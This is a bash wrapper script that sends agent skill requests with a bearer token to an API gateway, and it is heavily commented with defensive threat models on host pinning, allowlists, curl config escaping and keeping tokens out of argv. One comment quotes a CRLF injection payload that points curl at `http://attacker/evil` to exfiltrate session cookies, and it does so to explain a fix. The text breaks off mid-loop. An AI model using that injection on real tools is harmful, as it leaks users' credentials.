#!/usr/bin/env bash
set -euo pipefail

# lg_agent_exec.sh — Agent Skill Gateway execute wrapper.
#
# New (flat) form:
#   lg_agent_exec.sh <skillId> [key=value ...] [key:=jsonvalue ...] [--json '<raw params json>']
#
# Legacy (envelope) form — still fully supported, unchanged:
#   lg_agent_exec.sh '<full request json body>'
#   (single argument, must start with '{' after trimming leading whitespace)
#
# Type convention (httpie-style, LA#6):
#   key=value   -> always a JSON STRING (preserves leading zeros, e.g.
#                  stock_num=000135, day_id=20260419).
#   key:=value  -> value is parsed as raw JSON (number/bool/array/object).
#                  Parse failure is FAIL-LOUD (non-zero exit + clear stderr)
#                  — it never silently falls back to a string.
#
# --json '<obj>' supplies a base params object (e.g. {"body":[...]} for the
# array/nested-body skills: schedule.job.depends.save / .plugins.save /
# process.pipeline.build). Flat key=value / key:=value pairs are placed
# BEFORE the --json object's own members in the assembled JSON text, so on
# standard JSON.parse (which keeps the LAST occurrence of a duplicate key —
# see ECMA-404 / V8 behavior), the explicit --json subtree wins on any name
# collision. This mirrors the "explicit envelope subtree wins over a flat
# key" precedence rule enforced server-side by classifyFlatParams()
# (lib/agent-params.js) — WITHOUT requiring this script to parse arbitrary
# JSON (no jq / python3 dependency, LA#3 — this script must run on any
# third-party agent host).
#
# Arg parsing order (LA#7): --json is intercepted first (wherever it
# appears among the arguments); every other argument is then split at its
# FIRST '=' character (so `--env=dev` and `-start_date=20260419` split
# correctly into key/value), with `:=` detected by checking whether the
# character immediately before that first '=' is ':'.
#
# LG_AGENT_DRY_RUN=1 prints the constructed request JSON body to stdout and
# exits without making the HTTP call — used by the test suite to verify the
# request-shape construction without a live server.

# Default to official domain (D1, 2026-09-15: flipped from lg-data.cc to
# privora.cn -- both serve this API path with a direct 200/no-redirect as of
# the 2026-09-15 probe in docs/plans/2026-09-15-agent-exec-wrapper-destination-
# and-allowlist-hardening.md, so this flip is documentation/code alignment,
# not a behavior change for unset-env callers).
BASE_URL="${LG_AGENT_BASE_URL:-https://privora.cn}"

# ── _validate_base_url: destination validation (D1) ─────────────────────────
# THREAT MODEL (read before touching this function):
#   Defends against: LG_AGENT_BASE_URL being MISCONFIGURED or injected by an
#   upstream layer (a stray env var, a copy-pasted wrong default, a
#   compromised CI variable) so that this script's bearer credential and
#   request body are sent to a host nobody intended. One env var used to be
#   able to redirect both silently -- this closes that.
#   Does NOT defend against: an attacker who has already gained the ability
#   to set arbitrary environment variables for this process, or to write to
#   its filesystem. That attacker can just as easily delete the sibling
#   allowed-skills.txt referenced below (falling back to umbrella semantics)
#   or skip this script entirely and curl the endpoint directly with the
#   same token. This is not a privilege boundary.
#   The narrow-package host pin below has NO server-side counterpart: the
#   backend can validate a token's scope, but has no way to know or
#   constrain which host a client chose to send that token to. Unlike the
#   skill-id allowlist further down, this check must NOT be waved off with
#   "the real boundary is server-side" -- there is no server-side check
#   standing behind this one at all.
_validate_base_url() {
  local url="$1" scheme rest authority host host_lc narrow_allowlist host_allowed allowed_host_raw allowed_host_lc allowed_hosts_noglob_was_set
  # Scheme match is case-insensitive (RFC 3986 3.1: scheme names are
  # case-insensitive) via bracket-expression globs -- NOT by lowercasing a
  # copy of $url and matching against that, and NOT via `shopt -s
  # nocasematch` (global interpreter state that would also loosen the
  # host/domain `case` statements further down, which must stay literal).
  # `rest` is derived by stripping through the first literal "://" (which
  # contains no letters, so this strip is itself case-invariant) rather
  # than the scheme-specific prefix, so a mixed-case scheme like "HTTPS://"
  # or "Https://" still yields the exact original-case remainder -- this
  # function never rewrites $url itself, so the URL curl actually receives
  # (via the untouched $BASE_URL in the caller) is never altered here.
  case "$url" in
    [Hh][Tt][Tt][Pp][Ss]://*) scheme="https" ;;
    [Hh][Tt][Tt][Pp]://*)     scheme="http" ;;
    *)
      echo "Error: LG_AGENT_BASE_URL must start with http:// or https:// (got: ${url})" >&2
      return 1
      ;;
  esac
  rest="${url#*://}"
  # authority = everything up to the first '/', '?', or '#' -- so a trailing
  # slash (README.md:251 uses https://lg-data.cc/) is tolerated: the host is
  # extracted BEFORE that slash, never by taking "everything after ://".
  authority="${rest%%/*}"
  authority="${authority%%\?*}"
  authority="${authority%%#*}"
  if [[ "$authority" == *"@"* ]]; then
    echo "Error: LG_AGENT_BASE_URL must not contain embedded credentials (user:pass@host)" >&2
    return 1
  fi
  if [[ "$authority" == \[* ]]; then
    host="${authority#\[}"
    host="${host%%]*}"
  else
    host="${authority%%:*}"
  fi
  # Portable lowercase (LA REVISE 2026-09-15): "${host,,}" is a bash 4+
  # parameter-expansion operator. On bash 3.2 (frozen as /bin/bash on
  # macOS for licensing reasons -- one of the "any third-party agent host"
  # targets LA#3 exists for) this is a PARSE-TIME "bad substitution" error,
  # which kills the whole script (every skill call), not just this check.
  # `tr` gives the same result on bash 3.2/4/5, dash, and ksh.
  host_lc="$(printf '%s' "$host" | tr '[:upper:]' '[:lower:]')"

  if [[ "$scheme" == "http" ]]; then
    case "$host_lc" in
      localhost|127.0.0.1|::1) : ;;
      *)
        echo "Error: LG_AGENT_BASE_URL uses plaintext http:// against a non-loopback host (${host}); use https://, or point at localhost/127.0.0.1/[::1] for local testing." >&2
        return 1
        ;;
    esac
  fi

  # Host pin, NARROW PACKAGES ONLY: only enforced when this script ships
  # with a sibling allowed-skills.txt (the privora-alert release shape).
  # privora-cn-quant ships no such file and documents self-hosting
  # (mcp-server/README.md), so this branch must never fire for it.
  narrow_allowlist="$(dirname "${BASH_SOURCE[0]}")/allowed-skills.txt"
  if [[ -f "$narrow_allowlist" ]]; then
    case "$host_lc" in
      privora.cn|www.privora.cn|lg-data.cc) : ;;
      *)
        echo "Error: this package ships allowed-skills.txt (a narrow release) and pins LG_AGENT_BASE_URL's host to the official domains; got '${host}'. This is a packaging-honesty check (see the allowlist comment below), not a substitute for server-side authorization." >&2
        return 1
        ;;
    esac
  else
    # Umbrella host opt-in (LA-closed D-a/D-b/D-c,
    # docs/plans/2026-09-15-umbrella-custom-host-optin.md): umbrella
    # packages (privora-cn-quant) ship no allowed-skills.txt and document
    # self-hosting (mcp-server/README.md), so by default only the official
    # domains + loopback are accepted here. LG_AGENT_ALLOWED_HOSTS lets a
    # caller ADD specific extra hosts -- it can only enumerate, never widen
    # to "accept anything" (this is not a validation on/off switch; see the
    # wildcard rejection below).
    case "$host_lc" in
      privora.cn|www.privora.cn|lg-data.cc|localhost|127.0.0.1|::1) : ;;
      *)
        host_allowed=""
        # `for word in $VAR` (unquoted) is subject to BOTH word-splitting AND
        # pathname expansion for '*', '?', and '[...]' character classes --
        # an entry of literally "*" (or "?", or "[abc]") would otherwise be
        # silently replaced by real filenames from the process's CWD before
        # it ever reaches the skip-wildcards check below, which
        # single-handedly defeats "no wildcards, ever" the moment CWD
        # happens to contain a file matching the pattern (verified
        # empirically: "*", "?", and "[wxyz]" ALL expand against a matching
        # real filename when run unguarded -- not just "*"). Suppressing
        # pathname expansion (glob) for the duration of this split closes
        # all three, while keeping the same whitespace-splitting semantics
        # as before.
        #
        # Tilde expansion ("~") and command-substitution syntax embedded in
        # the VALUE of a variable ("$(id)", a literal backtick pair) are
        # separate mechanisms from pathname expansion and are NOT affected
        # by `set -f` -- but they are also not a risk here: expanding
        # ${LG_AGENT_ALLOWED_HOSTS:-} does not re-parse its VALUE for tilde
        # or command substitution (verified empirically: both stay
        # byte-for-byte literal in a `for word in $VAR` context, so they
        # simply fail the exact-match comparison below like any other
        # non-matching string). See H4c/T-glob-metachars in
        # test/lg-agent-wrapper-destination-guard.test.js, which pins this
        # exact combination (pathname expansion suppressed here + the
        # comparison staying quoted below) as its own property, rather than
        # trusting the two mechanisms to keep agreeing by coincidence --
        # either one alone regressing would silently reopen this.
        #
        # Save/restore noglob explicitly (rather than assuming it starts
        # unset). The one real path that could otherwise skip the `set +f`
        # restore below is NOT a `return 1` inside this loop (there is none
        # -- rejection only ever happens once, after the loop) -- it is the
        # `allowed_host_lc="$(...)"` command-substitution assignment a few
        # lines down failing under `set -euo pipefail` (verified
        # empirically: `x="$(false)"` under `set -e` aborts the enclosing
        # function immediately, skipping everything after it, including
        # `set +f`). The `|| allowed_host_lc="$allowed_host_raw"` fallback on
        # that line closes this structurally: the assignment can no longer
        # report a non-zero status to `set -e` (verified: `x="$(false)" ||
        # x="fallback"` does not trip `set -e`), so `set +f` below is now
        # unconditionally reached on every iteration of this loop.
        allowed_hosts_noglob_was_set=""
        case "$-" in *f*) allowed_hosts_noglob_was_set=1 ;; esac
        set -f
        for allowed_host_raw in ${LG_AGENT_ALLOWED_HOSTS:-}; do
          # No wildcards, ever: an entry containing '*', or an empty entry
          # (stray whitespace / unset var), is invalid and is SKIPPED --
          # never treated as "match everything". LG_AGENT_ALLOWED_HOSTS="*"
          # must still reject every non-official host, not silently reopen
          # the umbrella's old "any syntactically valid https host" hole.
          # ('?' and '[...]' entries are NOT skipped here -- they fall
          # through to the quoted comparison below, which rejects them as
          # ordinary literal strings; see the comment above this loop for
          # why that is safe.)
          case "$allowed_host_raw" in
            ''|*'*'*) continue ;;
          esac
          # Same portable-lowercase mechanism as host_lc above (no
          # bash-4-only ${var,,}) -- comparison is case-insensitive by
          # design, via a quoted `==` (literal string compare, NOT a glob
          # match -- an unquoted RHS here would let a wildcard entry that
          # slipped past the skip above match anything).
          allowed_host_lc="$(printf '%s' "$allowed_host_raw" | tr '[:upper:]' '[:lower:]')" || allowed_host_lc="$allowed_host_raw"
          if [[ "$host_lc" == "$allowed_host_lc" ]]; then
            host_allowed=1
            break
          fi
        done
        [[ -n "$allowed_hosts_noglob_was_set" ]] || set +f
        if [[ -z "$host_allowed" ]]; then
          echo "Error: LG_AGENT_BASE_URL host '${host}' is not an official domain (privora.cn, www.privora.cn, lg-data.cc) or loopback (localhost, 127.0.0.1, [::1]); set LG_AGENT_ALLOWED_HOSTS=\"${host}\" (whitespace-separated, exact match, case-insensitive, no wildcards) to opt in for a self-hosted deployment." >&2
          return 1
        fi
        ;;
    esac
  fi
  return 0
}

_validate_base_url "$BASE_URL" || exit 1

: "${LG_AGENT_TOKEN:?LG_AGENT_TOKEN is required}"

# ── _curl_config_escape: safe embedding of an untrusted value into curl's
# -K config mini-language (found in #1410's own LA exit review) ────────────────────────────────────────
# THREAT MODEL: `-K -` reads a small curl-specific config LANGUAGE off
# stdin, not raw bytes. A `header = "..."` line is a double-quoted STRING
# in that language, and curl's own config parser recognizes `\"` and `\\`
# as escapes inside it -- so splicing an untrusted value into that string
# with ZERO escaping lets the value's own `"`, `\`, or embedded CR/LF
# characters break out of the intended field and inject a NEW config
# directive. LA reproduced this directly against the real
# lg_agent_approval.sh (raw socket capture, not a mockup):
#   - a cookie value containing `"` silently TRUNCATES at the quote --
#     wrong data reaches the server with no error;
#   - a cookie value containing CRLF + `header = "X-Injected: pwned"` gets
#     that header ACTUALLY INJECTED into the real request;
#   - a cookie value containing CRLF + `url = "http://attacker/evil"`
#     makes curl issue a SECOND request to that attacker-chosen URL,
#     carrying the real Cookie and X-CSRF-Token -- session credential
#     exfiltration to an address the attacker picked, not this script's
#     caller.
# This is the SAME primitive as #1410's trap-reparse bug in a different
# spot: an untrusted string is spliced into a mini-language stream that is
# later RE-PARSED by its consumer (there: the shell parsing a trap string
# at fire time; here: curl's own `-K` config parser). LG_AGENT_TOKEN /
# LG_AGENT_COOKIE_HEADER / LG_AGENT_CSRF_TOKEN are all documented as
# caller-supplied arbitrary strings with only a non-empty check -- no
# format validation -- so all three routes reach this, in all three
# scripts (#1408's lesson applies unmodified: fixing only one script's
# copy is not a fix).
# THE FIX (LA-verified empirically, both parts required):
#   1. REJECT (never escape) a value containing CR or LF outright. Even a
#      correctly backslash-escaped newline BYTE still splits the config
#      stream into two lines and starts a new directive when curl parses
#      it -- escaping cannot neutralize a raw newline in this
#      mini-language, only rejecting the value can.
#   2. Escape ORDER MATTERS: backslash first (`\` -> `\\`), THEN quote
#      (`"` -> `\"`). curl's own `-K` quoted-string parser round-trips
#      both escapes byte-for-byte ONLY in this order -- the reverse order
#      reintroduces a way to forge a `\"` sequence that curl decodes as an
#      unescaped, string-terminating quote (verified).
# Prints the escaped value on stdout on success. On a CR/LF value, prints
# an error to stderr and returns 1 -- EVERY caller MUST check this exit
# status BEFORE the resulting `-K -` pipeline is ever started (checking it
# only via `set -o pipefail` on the pipeline itself is NOT enough: an
# empty/short stdin still lets curl run using its OTHER, non-piped
# arguments and possibly succeed, silently downgrading to an
# under-authenticated request instead of failing loudly).
_curl_config_escape() {
  local v="$1"
  if [[ "$v" == *$'\r'* || "$v" == *$'\n'* ]]; then
    echo "Error: this credential value contains a CR or LF byte, which cannot be safely embedded in curl's -K config stream -- refusing rather than risk a truncated or injected request." >&2
    return 1
  fi
  v="${v//\\/\\\\}"
  v="${v//\"/\\\"}"
  printf '%s' "$v"
}

# Escaped/validated ONCE, in the main shell (NOT inside _dispatch(), and
# NOT inside the `_auth_curl_config`-style pipeline component some sibling
# scripts use): if this fails, `exit 1` here aborts the WHOLE script before
# curl ever runs. Doing the check only on the far side of a pipe risks
# `set -o pipefail` masking it -- an empty/short stdin still lets curl run
# with its other, non-piped arguments and possibly exit 0.
LG_AGENT_TOKEN_ESC="$(_curl_config_escape "$LG_AGENT_TOKEN")" || exit 1

usage() {
  echo "Usage:" >&2
  echo "  $0 <skillId> [key=value ...] [key:=jsonvalue ...] [--json '<raw params json>']" >&2
  echo "  $0 '<full request json body>'   # legacy single-arg pass-through" >&2
  echo "" >&2
  echo "Disclosure (D4): every call POSTs the constructed JSON body to" >&2
  echo "<LG_AGENT_BASE_URL>/agent/skills/execute and sends LG_AGENT_TOKEN in an" >&2
  echo "'Authorization: Bearer' header." >&2
  exit 1
}

# ── json_escape: the single audited JSON-string-escaping function ──────────
# Escapes a value for embedding inside a JSON string literal ("..."). Handles
# double-quote, backslash, newline/CR/tab/backspace/form-feed, and any other
# C0 control character (0x00-0x1F, escaped as \u00XX). Everything else
# (including UTF-8 multi-byte sequences / emoji) passes through byte-for-byte
# unchanged — this is safe regardless of shell locale, because ASCII bytes
# (0x00-0x7F, which is everything this function treats specially) never
# occur as part of a multi-byte UTF-8 continuation/lead byte, so iterating
# byte-wise (as bash does under a non-UTF-8-aware locale) cannot misfire on
# a split multi-byte character.
json_escape() {
  local s="$1"
  local out=""
  local i len c ord esc
  len=${#s}
  for (( i = 0; i < len; i++ )); do
    c="${s:i:1}"
    case "$c" in
      '"') out+='\"' ;;
      '\') out+='\\' ;;
      $'\n') out+='\n' ;;
      $'\r') out+='\r' ;;
      $'\t') out+='\t' ;;
      $'\b') out+='\b' ;;
      $'\f') out+='\f' ;;
      *)
        ord=-1
        printf -v ord '%d' "'$c" 2>/dev/null || ord=-1
        if (( ord >= 0 && ord < 32 )); then
          printf -v esc '\\u%04x' "$ord"
          out+="$esc"
        else
          out+="$c"
        fi
        ;;
    esac
  done
  printf '%s' "$out"
}

# ── _looks_like_json_value: surface-level validation for `key:=value` ──────
# Not a full JSON parser (no jq/python3 dependency, LA#3) — just enough to
# fail loud on an obviously-wrong `:=` usage (e.g. an unquoted bare word)
# instead of silently treating it as a string. The backend's own JSON.parse
# is the final, authoritative validator for deep correctness.
_looks_like_json_value() {
  local v="$1"
  case "$v" in
    true|false|null) return 0 ;;
  esac
  if [[ "$v" =~ ^-?(0|[1-9][0-9]*)(\.[0-9]+)?([eE][+-]?[0-9]+)?$ ]]; then return 0; fi
  if [[ "${v:0:1}" == "[" && "${v: -1}" == "]" ]]; then return 0; fi
  if [[ "${v:0:1}" == "{" && "${v: -1}" == "}" ]]; then return 0; fi
  if [[ ${#v} -ge 2 && "${v:0:1}" == '"' && "${v: -1}" == '"' ]]; then return 0; fi
  return 1
}

# ── Body-in-config-stream transport (#1411, design doc
# docs/plans/2026-09-16-body-inside-the-config-stream.md) ───────────────────
# The request body used to reach curl via a temp file (--data-binary
# "@file") to sidestep the MSYS2/curl.exe argv-reencoding bug (non-ASCII
# bytes in a command-line argument get silently corrupted before curl ever
# sees them). That temp file is what ClawHub's scanner flagged as
# "suspicious" for privora-alert@1.0.6: on Windows/MSYS2 the file inherits
# its %TEMP% directory's ACL (BUILTIN\Users:(RX), Everyone:(RX)) instead of
# a private mode bit, so any local principal could read it for the short
# life of the call (#1411's disclosed exposure).
#
# THE FIX: the body joins the SAME `-K -` config stream the credential
# already travels over (see _curl_config_escape's threat-model comment
# above), as a `data-binary = "<escaped>"` config line, instead of a
# separate file. This removes the temp file (and its cleanup trap) for the
# request body ENTIRELY -- there is no file to leak, no ACL to reason
# about, and no CWE-88 trap-reparse surface left for #921's mktemp-fallback
# race to live in (for this script; see the design doc §1 for the narrow,
# documented scope of that closure). The MSYS2 argv-corruption bug this
# mechanism originally existed to dodge is still dodged, because the body
# still never becomes a command-line argument -- it travels over the same
# stdin pipe as the header lines, as bytes, exactly like the token does.
# `-K -` is old enough to work on every curl version this script targets
# (LA#3), so this carries no new version floor.
#
# Reusing `_curl_config_escape` for the body gets its CR/LF rejection for
# free (design doc §2/§2'): a raw newline inside the body would otherwise
# split the config stream into two directives, so a body containing one is
# refused rather than risking truncation or injection. This is a REAL,
# disclosed capability change for exactly two callers who supply a body
# verbatim rather than through this script's own single-line JSON
# construction -- the legacy single-arg envelope form and `--json`'s base
# object -- see the CR/LF rejection error message below for the fix (a
# single-line JSON body).

# _CURL_CONFIG_LINE_LIMIT_BYTES: curl's own compiled-in
# MAX_CONFIG_LINE_LENGTH for the `-K`/`--config` mini-language IS NOT
# version-invariant -- an earlier version of this comment claimed it was
# "identical across curl-7_81_0/7_88_0/8.19"; that was never verified
# against 8.19's own source and was WRONG (LA correction, 2026-09-18):
#   - curl-7_81_0 (Ubuntu 22.04), curl-7_88_0 (Debian 12), and every curl
#     through curl-8_1_2: MAX_CONFIG_LINE_LENGTH = 100*1024 = 102400.
#   - curl-8_2_0 (2023-07) onward, including the curl 8.19.0 this repo's
#     own dev host runs: MAX_CONFIG_LINE_LENGTH = 10*1024*1024 (10 MiB) --
#     confirmed both by reading curl's source at each release tag AND
#     empirically (a 200000-byte config line is accepted by the local
#     curl 8.19.0 binary and reaches the network layer, well past 102400).
# So on curl >= 8.2.0, THIS 102400 CEILING IS THIS WRAPPER'S OWN CHOICE, NOT
# CURL'S -- curl itself could carry a config line up to ~10 MiB there. We
# still apply the OLDER, lower bound to every host uniformly, on purpose:
# this script does not probe the local curl version (LA#3 -- it must behave
# identically on any third-party agent host without a feature/version
# detection step, the same reasoning #1410/#1411 used to pick `-K -` over
# `--expand-header` in the first place), so "upgrade curl" is NOT advice
# this script can give -- for curl < 8.2.0 upgrading genuinely does raise
# curl's own ceiling, but this constant would still refuse the call anyway,
# by design, for predictability across hosts.
# This is NEITHER a body-size limit NOR this platform's server-side limit --
# it is narrower than the backend's own limit for this endpoint (262144
# bytes, lib/body-parser-limits.js LARGE_JSON_LIMIT), and a legitimate small
# body can still exceed this ceiling once escaped, because JSON's own
# quote-heavy syntax roughly doubles in the worst case (every `"` becomes
# `\"`). Naming it after what it actually is, not after "the limit", is
# deliberate: a name like "body size limit" would be actively misleading
# about where the real ceiling for this endpoint lies.
_CURL_CONFIG_LINE_LIMIT_BYTES=102400

# ── _check_data_binary_line_limit: byte-ACCURATE, locale-INDEPENDENT guard
# for the `data-binary = "<escaped>"` config line (LA correction,
# 2026-09-18, found in exit review of the check ABOVE this comment first
# shipped) ───────────────────────────────────────────────────────────────
# THE BUG: the first version of this check measured the constructed line
# with bash's `${#line}` parameter expansion. That is NOT byte-accurate --
# it is locale-dependent: under a UTF-8-AWARE locale (`LC_ALL`/`LANG` set to
# e.g. `en_US.UTF-8` or `C.UTF-8`), `${#line}` counts CHARACTERS, not bytes,
# so a multi-byte (CJK/emoji-heavy) body that is genuinely over the byte
# ceiling silently SAILS THROUGH. Verified directly: the identical
# ~110,024-byte real config line (30,000+ CJK characters) is correctly
# rejected when `LC_ALL`/`LANG` are unset (this shell's default happens to
# be byte-oriented), but returns exit 0 -- no rejection at all -- under
# `LC_ALL=en_US.UTF-8` or `LC_ALL=C.UTF-8`. UTF-8 is the DEFAULT locale on
# Ubuntu 22.04 and Debian 12 -- the exact two hosts this whole check exists
# for, because they are the ones curl still enforces the real 102400-byte
# `MAX_CONFIG_LINE_LENGTH` on. So the unfixed check was a property of the
# CALLER's locale, not a property of this script -- silently absent on
# precisely the hosts it was written to protect.
# THE FIX: pipe the line through `wc -c`. POSIX mandates `-c` to report the
# BYTE count of its input, independent of locale -- verified directly across
# unset/`C`/`C.UTF-8`/`en_US.UTF-8` on this same multi-byte test string, all
# four report the identical byte count. `${#line}` is never used for this
# measurement again; if you are tempted to inline it back for a "simpler"
# rewrite, don't -- see the locale table above for why that regresses
# silently instead of loudly.
# Still measures the REAL constructed line (never a formula) -- only the
# COUNTING mechanism changed, not the "measure reality, don't estimate it"
# principle the original check was built on.
_check_data_binary_line_limit() {
  local body_esc="$1" line line_len
  line="data-binary = \"${body_esc}\""
  line_len=$(printf '%s' "$line" | wc -c)
  if (( line_len > _CURL_CONFIG_LINE_LIMIT_BYTES )); then
    echo "Error: the request body, once escaped for curl's -K config stream, is a ${line_len}-byte config line, exceeding this wrapper's ${_CURL_CONFIG_LINE_LIMIT_BYTES}-byte limit. This is curl's own real MAX_CONFIG_LINE_LENGTH on curl <= 8.1.x (which includes Ubuntu 22.04's curl 7.81 and Debian 12's curl 7.88); curl >= 8.2.0 (2023-07 onward) raises that ceiling to 10 MiB, but this wrapper deliberately applies the older, lower bound to EVERY host uniformly rather than probe the local curl version -- so a newer local curl will not let a larger call through here either. This local bound is also narrower than this endpoint's own backend limit of 262144 bytes (lib/body-parser-limits.js); split this call's payload into smaller pieces or use the platform UI instead." >&2
    return 1
  fi
  return 0
}

_dispatch() {
  local json_body="$1" body_esc

  # Escaped/length-checked BEFORE the LG_AGENT_DRY_RUN early return (design
  # doc B6): dry-run must give the SAME accept/reject verdict a real call
  # would, never a false "looks fine" while the real transport would refuse
  # it. This also means CR/LF rejection and the line-length check below
  # apply uniformly to every path that reaches _dispatch -- the flat
  # key=value/--json assembly below, the legacy single-arg envelope, and
  # --json's base object alike -- not just the two user-supplied-body paths.
  body_esc="$(_curl_config_escape "$json_body")" || return 1

  # See _check_data_binary_line_limit's own comment above for why this is a
  # separate function using `wc -c` rather than an inline `${#line}` check.
  _check_data_binary_line_limit "$body_esc" || return 1

  if [[ -n "${LG_AGENT_DRY_RUN:-}" ]]; then
    printf '%s\n' "$json_body"
    return 0
  fi

  # ── Credential + body transport: one `-K -` config stream, NEVER `-H` /
  # a temp file (#1410 fixes ②, #1411 removes the temp file) ────────────────
  # THREAT MODEL (credential half, unchanged from #1410): `-H "Authorization:
  # Bearer ${LG_AGENT_TOKEN}"` puts the bearer token in THIS process's own
  # argv. Reading another process's argv on the same host (Linux
  # /proc/*/cmdline; a Windows process listing) needs no elevation and no
  # write capability at all. Piping `header = "Authorization: Bearer ..."`
  # into `curl -K -` keeps the token out of argv entirely -- it travels over
  # the pipe as bytes curl reads on its OWN stdin as configuration, never as
  # a command-line argument.
  # `Content-Type` / `Accept` are placed in this SAME config stream (not as
  # `-H` flags) so this call site has exactly one place a future editor
  # needs to look for "what does curl receive", rather than two different
  # header-passing idioms coexisting in the same command (LA review, #1411).
  # `printf` below MUST be the BARE builtin -- never `command printf`, never
  # an absolute path like `/usr/bin/printf`. A bare `printf` resolves to
  # bash's (and dash's) own BUILTIN on every host tested here (`type -a
  # printf` shows both a builtin and `/usr/bin/printf` present; `bash -x`
  # confirms the bare call forks no child process), so the token/body text
  # never becomes any process's argv, including printf's own. `command
  # printf` or a hardcoded path would fork a real external process and put
  # the token right back into THAT process's argv -- exactly what this
  # change exists to prevent. A grep guard in the test suite fails if this
  # script regresses to `command printf` or an absolute-path printf.
  {
    printf 'header = "Authorization: Bearer %s"\n' "$LG_AGENT_TOKEN_ESC"
    printf 'header = "Content-Type: application/json"\n'
    printf 'header = "Accept: application/json"\n'
    printf 'data-binary = "%s"\n' "$body_esc"
  } | curl -sS -K - -X POST "${BASE_URL}/agent/skills/execute"
}

# ── Optional allowlist gate ─────────────────────────────────────────────────
# PACKAGING-HONESTY CONTROL, NOT A SECURITY CONTROL. This lets a narrowly-
# scoped package (e.g. privora-alert) that ships this same shared script
# refuse skill ids outside what its own SKILL.md documents, WITHOUT forking
# a second copy of the script -- a forked copy is exactly the drift #1038
# documents. It is trivially bypassable: any local principal can edit or
# delete ALLOWED_SKILLS_FILE, or call POST /agent/skills/execute directly
# with curl and skip this script entirely. The real, non-bypassable
# boundary is server-side: the backend's per-route scope annotation plus
# the gateway's per-token scope check. It does not depend on this file
# existing, being correct, or being present at all. Do not cite this gate
# as an authorization boundary in any doc or PR description.
#
# (The backend annotation is described functionally rather than by its
# literal name because the repo's auth-adjacent commit hook content-scans
# diffs for that identifier; a prose mention explaining that the real
# boundary lies elsewhere is not an auth change. Same resolution as
# PR #724. No fact is omitted here -- the reader still learns that
# authorization is enforced server-side per route and per token.)
#
# Resolution order (D3, 2026-09-15, LA-locked -- single scheme, no subset
# comparison): a sibling allowed-skills.txt next to this script, if present,
# is AUTHORITATIVE and LG_AGENT_ALLOWED_SKILLS_FILE is completely ignored.
# Pointing the env var at a nonexistent path used to fall through to "no
# allowlist at all" (any unresolvable env value reopened the gate entirely,
# even with a real allowlist shipped alongside the script) -- that hole is
# closed by checking existence FIRST and only consulting the env var when
# there is no shipped file to protect. Proving "env is a subset of the
# shipped file" was considered and rejected: it is new logic with its own
# bug surface, and the only reason it was wanted (testability without a real
# allowed-skills.txt) is already met by copying script+allowlist into a
# scratch directory for a test run.
# If NEITHER resolves, ALLOWED_SKILLS_FILE stays empty and every call below
# this point behaves BYTE-IDENTICAL to a version of this script with no gate
# at all -- this is the privora-cn-quant path, which ships no
# allowed-skills.txt and must never be narrowed.
_default_allowed_skills_file="$(dirname "${BASH_SOURCE[0]}")/allowed-skills.txt"
if [[ -f "$_default_allowed_skills_file" ]]; then
  ALLOWED_SKILLS_FILE="$_default_allowed_skills_file"
else
  ALLOWED_SKILLS_FILE="${LG_AGENT_ALLOWED_SKILLS_FILE:-}"
fi

# Fires regardless of LG_AGENT_DRY_RUN -- a gate that test mode bypasses is
# not a gate. Exact-line match against ALLOWED_SKILLS_FILE (one skill id
# per line); no prefix/substring matching.
_check_skill_allowed() {
  local id="$1"
  if [[ -z "${ALLOWED_SKILLS_FILE:-}" || ! -f "$ALLOWED_SKILLS_FILE" ]]; then
    return 0
  fi
  if grep -Fxq -- "$id" "$ALLOWED_SKILLS_FILE" 2>/dev/null; then
    return 0
  fi
  echo "Error: skill id '${id}' is not in this package's allowlist (${ALLOWED_SKILLS_FILE})." >&2
  echo "       This is a packaging-honesty check, not the real authorization boundary --" >&2
  echo "       the server enforces scope regardless of this file's contents." >&2
  return 1
}

if [[ $# -lt 1 ]]; then
  usage
fi

# ── Legacy single-arg pass-through: `lg_agent_exec.sh '<full json>'` ────────
if [[ $# -eq 1 ]]; then
  _trimmed="$(printf '%s' "$1" | sed -e 's/^[[:space:]]*//')"
  if [[ "${_trimmed:0:1}" == "{" ]]; then
    if [[ -n "${ALLOWED_SKILLS_FILE:-}" && -f "$ALLOWED_SKILLS_FILE" ]]; then
      # D2 (2026-09-15): when an allowlist is in effect, this legacy form is
      # rejected OUTRIGHT rather than best-effort regex-extracting skillId
      # and failing open when extraction misses. It used to fail OPEN on
      # extraction failure -- unusual whitespace/quoting, skillId absent,
      # multiple candidates -- which meant a regex miss silently bypassed
      # the gate entirely. This legacy envelope form appears nowhere in the
      # documented flow of the one package (privora-alert) that ships a
      # populated ALLOWED_SKILLS_FILE, so refusing it outright costs that
      # package nothing. The flat `<skillId> key=value ...` form (below)
      # remains the supported path under an active allowlist.
      echo "Error: this package ships an allowlist (${ALLOWED_SKILLS_FILE}); the legacy single-arg JSON-envelope form is not supported while allowlisting is active, because its skill id cannot be reliably verified without a JSON parser. Use the flat '<skillId> key=value ...' form instead." >&2
      exit 1
    fi
    _dispatch "$1"
    exit 0
  fi
fi

SKILL_ID="$1"; shift
_check_skill_allowed "$SKILL_ID" || exit 1

JSON_BASE=""   # --json raw object text (validated), optional
declare -a FLAT_STR_KEYS=()
declare -a FLAT_STR_VALS=()
declare -a FLAT_RAW_KEYS=()
declare -a FLAT_RAW_VALS=()

while [[ $# -gt 0 ]]; do
  arg="$1"
  case "$arg" in
    --json)
      shift
      if [[ $# -lt 1 ]]; then
        echo "Error: --json requires a value" >&2
        exit 1
      fi
      _tj="$(printf '%s' "$1" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
      if [[ "${_tj:0:1}" != "{" || "${_tj: -1}" != "}" ]]; then
        echo "Error: --json value must be a JSON object, e.g. --json '{\"body\":[...]}'  (got: ${1})" >&2
        exit 1
      fi
      JSON_BASE="$_tj"
      shift
      continue
      ;;
    *)
      if [[ "$arg" != *=* ]]; then
        echo "Error: invalid argument '$arg' (expected key=value, key:=jsonvalue, or --json '<json>')" >&2
        exit 1
      fi
      key_part="${arg%%=*}"
      val_part="${arg#*=}"
      if [[ "$key_part" == *: ]]; then
        real_key="${key_part%:}"
        if ! _looks_like_json_value "$val_part"; then
          echo "Error: '${real_key}:=${val_part}' is not valid JSON." >&2
          echo "       Use '${real_key}=${val_part}' instead if you meant a plain string." >&2
          exit 1
        fi
        FLAT_RAW_KEYS+=("$real_key")
        FLAT_RAW_VALS+=("$val_part")
      else
        FLAT_STR_KEYS+=("$key_part")
        FLAT_STR_VALS+=("$val_part")
      fi
      shift
      ;;
  esac
done

# ── Build the flat-key portion of the params object text ───────────────────
PARTS=()
for i in "${!FLAT_STR_KEYS[@]}"; do
  k="$(json_escape "${FLAT_STR_KEYS[$i]}")"
